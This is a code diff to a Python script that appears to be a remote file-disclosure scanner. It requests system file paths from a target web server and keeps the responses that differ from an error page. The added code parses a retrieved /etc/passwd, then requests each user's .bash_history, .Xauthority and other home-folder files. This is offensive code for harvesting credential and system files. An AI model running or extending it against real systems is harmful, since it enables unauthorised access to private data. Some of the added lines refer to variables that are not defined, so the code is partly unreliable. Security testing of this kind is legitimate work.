@@ -278,7 +278,7 @@ def main():
     print("[*] Done!\n")
     print("[*] Searching for files...")
 
-    def request_file(case, found):
+    def request_file(case):
         """
         Request file from URL
         """
@@ -289,7 +289,7 @@ def main():
             if args.verbose:
                 print("[o] Skipping '%s'" % case["location"])
 
-            return None, found
+            return None
 
         if args.prefix and args.prefix[len(args.prefix) - 1] == "/":
             args.prefix = args.prefix[:-1]
@@ -301,14 +301,12 @@ def main():
         html, _ = get_page(**request_args)
 
         if not html:
-            return None, found
+            return None
 
         matcher = difflib.SequenceMatcher(None, clean_response(html, case["location"]), clean_response(invalid_response, INVALID_FILENAME))
 
         if matcher.quick_ratio() < HEURISTIC_RATIO:
             if not found:
-                found = True
-
                 print("[*] Possible file(s) found!\n")
                 print("[*] OS: %s\n" % case["os"])
 
@@ -322,33 +320,43 @@ def main():
             if args.verbose:
                 files.append("'%s' (%s/%s/%s)" % (case["location"], case["os"], case["category"], case["type"]))
 
-            # If --write-file is set.
+            # If --write-file is set
             if args.write_file:
                 _ = os.path.join("output", parsed_url.netloc)
                 if not os.path.exists(_):
                     os.makedirs(_)
-                with open(os.path.join(_, "%s.txt" % case["location"].replace(args.replace_slash if args.replace_slash else "/" , "_")), "w") as f:
+                with open(os.path.join(_, "%s.txt" % case["location"].replace(args.replace_slash if args.replace_slash else "/", "_")), "w") as f:
                     f.write(html)
-
-        return html, found
+            return html
+        return None
 
     # Test file locations in XML file
     for case in cases:
-        html, found = request_file(case, found)
+        html = request_file(case)
 
-        if html is None or not found:
+        if html is None:
             continue
+        if not found:
+            found = True
 
         # If --skip-file-parsing is not set.
         if case["location"] in ("/etc/passwd", "/etc/security/passwd") and not args.skip_parsing:
             users = re.findall("(?P<username>[^:\n]+):(?P<password>[^:]*):(?P<uid>\d+):(?P<gid>\d*):(?P<info>[^:]*):(?P<home>[^:]+):[/a-z]*", html)
+
+            print("\n[i] Extracting home folders from %s." % case["location"])
+
             for user in users:
-                username, password, uid, gid, info, home = user
+                if verbose:
+                    print("[o] User: %s, Info: %s" % (user[0], user[4]))
+                for _ in (".bash_config", ".bash_history", ".bash_logout", ".ksh_history", ".Xauthority"):
+                    if user[5] == "/": # Will later add a constraint to only check root folder "/" once.
+                        continue
+                    request_file({"category": "*NIX Password File", "type": "conf", "os": case["os"], "location": "%s/%s" % (user[5], _), "software": "*NIX"})
 
     if not found:
         print("[*] No files found!")
     elif args.verbose:
-        print "\n[i] Found files:"
+        print "\n[i] Files found:"
         for _ in files:
             print "[+] %s" % _
 
